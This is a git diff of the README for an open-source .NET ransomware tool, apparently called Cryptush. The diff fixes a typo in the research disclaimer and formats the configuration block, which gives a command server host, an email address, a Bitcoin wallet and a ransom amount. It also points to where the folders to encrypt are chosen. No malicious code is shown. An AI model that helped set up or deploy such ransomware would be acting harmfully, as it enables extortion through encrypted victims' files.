@@ -8,7 +8,7 @@ An open-source ransomware tool written in .NET
 
 ## Disclaimer
 
-The tools is intended for research and threat emulation purposes only. I'm not reponsible for any malicious uses of this tool.
+The tool is intended for research and threat emulation purposes only. I'm not reponsible for any malicious uses of this tool.
 
 ## The Flow
 
@@ -50,12 +50,14 @@ A reconnect attempt will be made every 30 seconds.
 
 * Edit the app.config file inside the Cryptush folder with your details:
 
+```
     <add key="ServerIP" value="ec2-3-68-73-27.eu-central-1.compute.amazonaws.com" />
     <add key="ServerPort" value="443" />
     <add key="Email" value="yuval555@gmail.com" />
     <add key="BtcWalletAddress" value="bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh" />
     <add key="BtcAmount" value="0.035" />
-    
+```    
+   
 * Select the folders to be encrypted in Cryptush.cs, the default is:
 
 ```
